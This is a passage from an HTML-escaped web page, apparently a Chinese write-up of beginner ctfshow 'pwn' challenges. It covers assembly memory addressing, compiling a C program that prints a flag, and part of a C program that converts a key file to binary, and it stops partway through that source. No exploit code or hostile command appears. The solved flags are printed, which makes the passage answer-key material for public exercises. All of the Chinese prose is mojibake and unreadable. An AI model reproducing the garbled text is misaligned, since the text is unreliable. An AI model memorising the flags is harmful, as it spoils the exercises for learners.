&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nf&#34;&gt;mov&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;eax&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;nb&#34;&gt;ecx&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;edx&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;2&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;-&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;6&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;  &lt;span class=&#34;c1&#34;&gt;; å°†ecx+edx*2-6æ‰€æŒ‡å‘çš„åœ°å€çš„å€¼èµ‹å€¼ç»™eax&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/32.png&#34;
	width=&#34;770&#34;
	height=&#34;164&#34;
	srcset=&#34;https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/32_hu_99e9e101810244d0.png 480w, https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/32_hu_f807a9c980e1f370.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;469&#34;
		data-flex-basis=&#34;1126px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;è·Ÿè¿›offset dword_80490E8ï¼š&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/33.png&#34;
	width=&#34;856&#34;
	height=&#34;105&#34;
	srcset=&#34;https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/33_hu_3157e877f3a9f1c1.png 480w, https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/33_hu_77b09f0915eccfa5.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;815&#34;
		data-flex-basis=&#34;1956px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;é‚£å°±æ˜¯ï¼š[8 + 0x80490E8 + 1*2 - 6] = [0x80490EC]&lt;/p&gt;
&lt;p&gt;æ•…flag:ctfshow{ome_to_CTFshow_PWN}&lt;/p&gt;
&lt;h3 id=&#34;pwn_013&#34;&gt;PWN_013
&lt;/h3&gt;&lt;p&gt;é¢˜ç›®ï¼šå¦‚ä½•ä½¿ç”¨GCCï¼Ÿç¼–è¯‘è¿è¡Œåå³å¯è·å¾—flag  &lt;a class=&#34;link&#34; href=&#34;PWN_013%5cPWN_013.c&#34; &gt;PWN_013.c&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;å­¦è¿‡Cè¯­è¨€éƒ½ä¼šå®‰è£…é…ç½®ç¼–è¯‘å™¨ç¯å¢ƒçš„ï¼Œæˆ‘è¿™é‡Œä½¿ç”¨çš„æ˜¯&lt;strong&gt;visual-studio-code&lt;/strong&gt;ã€‚&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/34.png&#34;
	width=&#34;1534&#34;
	height=&#34;466&#34;
	srcset=&#34;https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/34_hu_a2d59cd0ef0b2014.png 480w, https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/34_hu_a654e108c81c213e.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;329&#34;
		data-flex-basis=&#34;790px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;è¿™æ®µä»£ç æ˜¯ä¸€ä¸ªç®€å•çš„ C ç¨‹åºï¼Œå®ƒä½¿ç”¨å­—ç¬¦æ•°ç»„ flag å­˜å‚¨äº†ä¸€ä¸ªåŠ å¯†çš„å­—ç¬¦ä¸²ï¼Œå¹¶é€šè¿‡ printfå‡½æ•°å°†å…¶æ‰“å°å‡ºæ¥ã€‚&lt;/p&gt;
&lt;p&gt;åœ¨è¿™æ®µä»£ç ä¸­ï¼Œ flag æ•°ç»„å­˜å‚¨äº†ä¸€ä¸²æ•´æ•°å€¼ï¼Œè¿™äº›æ•´æ•°å€¼ä»£è¡¨äº†å­—ç¬¦çš„ ASCII ç ã€‚é€šè¿‡å°†è¿™äº›æ•´æ•°å€¼è½¬æ¢ä¸ºç›¸åº”çš„å­—ç¬¦ï¼Œå°±å¯ä»¥è¿˜åŸå‡ºåŸå§‹çš„å­—ç¬¦ä¸²ã€‚&lt;/p&gt;
&lt;p&gt;è¿è¡Œè¯¥ç¨‹åºï¼Œ printf å‡½æ•°ä½¿ç”¨ %s æ ¼å¼å­—ç¬¦ä¸²å°† flag æ•°ç»„ä½œä¸ºå‚æ•°è¿›è¡Œæ‰“å°ã€‚ç”±äº flag æ•°ç»„çš„æœ€åä¸€ä¸ªå…ƒç´ ä¸ºé›¶ï¼ˆNULL å­—ç¬¦ï¼‰ï¼Œ printf å‡½æ•°ä¼šå°†å…¶ä¹‹å‰çš„å­—ç¬¦ä¾æ¬¡æ‰“å°ï¼Œç›´åˆ°é‡åˆ° NULL å­—ç¬¦ä¸ºæ­¢ã€‚æ ¹æ®ç»™å®šçš„æ•´æ•°å€¼æ•°ç»„ï¼Œè¿˜åŸå‡ºçš„å­—ç¬¦ä¸²ä¸ºï¼š ctfshow{hOw_t0_us3_GCC?} ã€‚&lt;/p&gt;
&lt;h3 id=&#34;pwn_014&#34;&gt;PWN_014
&lt;/h3&gt;&lt;p&gt;é¢˜ç›®ï¼šè¯·ä½ é˜…è¯»ä»¥ä¸‹æºç ï¼Œ&lt;strong&gt;ç»™å®škeyä¸ºâ€CTFshowâ€&lt;/strong&gt;ï¼Œç¼–è¯‘è¿è¡Œå³å¯è·å¾—flagã€‚ &lt;a class=&#34;link&#34; href=&#34;PWN_014%5cPWN_014.c&#34; &gt;PWN_014.c&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;è¿™ä¸ªæ–‡ä»¶æœ‰å¼ºåº¦äº†ï¼Œç›´æ¥ç¼–è¯‘è¿è¡Œä¼šè¯´nothing is hereï¼Œä¸ç»™flagï¼Œå…ˆè¯»ä¸€ä¸‹è¿™ä¸ªCè¯­è¨€æ–‡ä»¶åœ¨å¹²ä»€ä¹ˆçš„ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;22
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;23
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;24
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;25
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;26
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;27
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;28
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;29
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;30
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;31
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;32
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;33
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;34
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;35
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;36
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;37
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;38
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;39
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;40
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;41
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;42
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;43
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;44
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;45
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;46
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;47
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;kt&#34;&gt;int&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;main&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;n&#34;&gt;FILE&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;fp&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;                  &lt;span class=&#34;c1&#34;&gt;// æ–‡ä»¶æŒ‡é’ˆï¼Œç”¨äºæ“ä½œæ–‡ä»¶
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;    &lt;span class=&#34;kt&#34;&gt;unsigned&lt;/span&gt; &lt;span class=&#34;kt&#34;&gt;char&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;buffer&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;BUFFER_SIZE&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;];&lt;/span&gt;  &lt;span class=&#34;c1&#34;&gt;// ç¼“å†²åŒºï¼Œå­˜å‚¨ä»æ–‡ä»¶è¯»å–çš„äºŒè¿›åˆ¶æ•°æ®
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;    &lt;span class=&#34;kt&#34;&gt;size_t&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;n&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;                  &lt;span class=&#34;c1&#34;&gt;// è®°å½•æ¯æ¬¡å®é™…è¯»å–çš„å­—èŠ‚æ•°
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;    &lt;span class=&#34;n&#34;&gt;fp&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;fopen&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;key&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;s&#34;&gt;&amp;#34;rb&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;   &lt;span class=&#34;c1&#34;&gt;// ä»¥äºŒè¿›åˆ¶åªè¯»æ–¹å¼æ‰“å¼€åä¸º &amp;#34;key&amp;#34; çš„æ–‡ä»¶
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;c1&#34;&gt;// æ£€æŸ¥æ–‡ä»¶æ˜¯å¦æˆåŠŸæ‰“å¼€
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;    &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;fp&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;==&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;NULL&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;nf&#34;&gt;perror&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;Nothing here!&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;  &lt;span class=&#34;c1&#34;&gt;// è‹¥æ‰“å¼€å¤±è´¥ï¼Œæ‰“å°é”™è¯¯ä¿¡æ¯
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;        &lt;span class=&#34;k&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;c1&#34;&gt;// è¾“å‡ºç¼“å†²åŒºï¼šå¤§å°ä¸º BUFFER_SIZE*9 + 12ï¼ˆé¢„ç•™è¶³å¤Ÿç©ºé—´å­˜å‚¨äºŒè¿›åˆ¶å­—ç¬¦ä¸²å’Œåˆ†éš”ç¬¦ï¼‰
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;    &lt;span class=&#34;kt&#34;&gt;char&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;output&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;BUFFER_SIZE&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;*&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;9&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;12&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;];&lt;/span&gt; 
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;kt&#34;&gt;int&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;offset&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;  &lt;span class=&#34;c1&#34;&gt;// è®°å½• output ä¸­å½“å‰å·²ä½¿ç”¨çš„ä½ç½®ï¼ˆåç§»é‡ï¼‰
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;c1&#34;&gt;// å…ˆåœ¨ output å¼€å¤´å†™å…¥ &amp;#34;ctfshow{&amp;#34;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;    &lt;span class=&#34;n&#34;&gt;offset&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+=&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;sprintf&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;output&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;offset&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;s&#34;&gt;&amp;#34;ctfshow{&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;c1&#34;&gt;// å¾ªç¯è¯»å–æ–‡ä»¶å†…å®¹ï¼šæ¯æ¬¡æœ€å¤šè¯» BUFFER_SIZE å­—èŠ‚ï¼Œç›´åˆ°æ–‡ä»¶ç»“æŸ
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;    &lt;span class=&#34;k&#34;&gt;while&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;((&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;n&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;fread&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;buffer&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;sizeof&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;kt&#34;&gt;unsigned&lt;/span&gt; &lt;span class=&#34;kt&#34;&gt;char&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;),&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;BUFFER_SIZE&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;fp&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;))&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;c1&#34;&gt;// éå†æœ¬æ¬¡è¯»å–çš„æ¯ä¸ªå­—èŠ‚
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;        &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;kt&#34;&gt;size_t&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;i&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;i&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;n&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;i&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;++&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            &lt;span class=&#34;c1&#34;&gt;// å°†å½“å‰å­—èŠ‚æ‹†åˆ†ä¸º 8 ä½äºŒè¿›åˆ¶ï¼ˆä»é«˜ä½åˆ°ä½ä½ï¼‰
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;            &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;kt&#34;&gt;int&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;j&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;7&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;j&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;&amp;gt;=&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;j&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;--&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;                &lt;span class=&#34;c1&#34;&gt;// (buffer[i] &amp;gt;&amp;gt; j) &amp;amp; 1ï¼šè·å–ç¬¬ j ä½ï¼ˆ0 æˆ– 1ï¼‰ï¼Œå¹¶å†™å…¥ output
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;                &lt;span class=&#34;n&#34;&gt;offset&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+=&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;sprintf&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;output&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;offset&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;s&#34;&gt;&amp;#34;%d&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;buffer&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;i&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;j&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;&amp;amp;&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            &lt;span class=&#34;c1&#34;&gt;// é™¤äº†æœ€åä¸€ä¸ªå­—èŠ‚ï¼Œæ¯ä¸ªå­—èŠ‚çš„äºŒè¿›åˆ¶ååŠ ä¸‹åˆ’çº¿ &amp;#34;_&amp;#34;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;            &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;i&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;!=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;n&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;-&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;                &lt;span class=&#34;n&#34;&gt;offset&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+=&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;sprintf&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;output&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;offset&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;s&#34;&gt;&amp;#34;_&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;c1&#34;&gt;// è‹¥æœªåˆ°æ–‡ä»¶æœ«å°¾ï¼Œåœ¨æœ¬æ¬¡ç¼“å†²åŒºæ•°æ®ååŠ ç©ºæ ¼ &amp;#34; &amp;#34;ï¼ˆåˆ†éš”ä¸åŒæ‰¹æ¬¡çš„è¯»å–ï¼‰
